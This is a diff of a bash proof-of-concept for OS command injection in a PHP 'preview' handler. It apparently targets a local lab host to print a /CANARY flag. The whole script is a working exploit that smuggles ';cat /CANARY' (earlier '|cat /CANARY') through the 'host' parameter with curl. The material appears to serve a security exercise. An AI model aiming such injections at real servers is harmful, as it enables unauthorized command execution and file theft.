@@ -1,8 +1,10 @@
 #!/usr/bin/env bash
-# PoC: OS command injection in shakedown target (127.0.0.1:8181)
-# Vulnerable param: host (GET), passed unsanitized to a shell command
-# by index.php's act=preview handler. Payload "|cat /CANARY" appends
-# an injected command whose output is returned in the HTTP body.
+# PoC: OS command injection in shakedown target (PHP 8.3.35, Apache/2.4.68)
+# Single command -> prints the target's /CANARY flag over HTTP.
 set -euo pipefail
-TARGET="http://127.0.0.1:8181/"
-curl -s -G "${TARGET}" --data-urlencode "act=preview" --data-urlencode "host=|cat /CANARY"
+
+TARGET="${1:-http://127.0.0.1:8181/}"
+
+# act=preview passes the unsanitized "host" GET parameter to a shell command.
+# ";cat /CANARY" terminates the intended command and appends our own.
+exec curl -sS -g "${TARGET}?act=preview&host=%3Bcat%20/CANARY"
